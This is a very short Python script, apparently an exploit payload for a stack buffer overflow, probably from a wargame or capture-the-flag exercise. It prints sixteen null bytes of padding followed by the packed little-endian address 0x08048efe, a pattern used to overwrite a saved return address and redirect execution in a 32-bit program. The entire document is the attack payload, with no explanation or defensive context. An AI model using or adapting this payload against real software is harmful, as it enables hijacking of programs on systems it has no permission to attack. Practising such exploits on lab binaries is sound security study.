from struct import pack
temp = "\x00" * 16
print (temp + pack("<I\n", 0x08048efe))
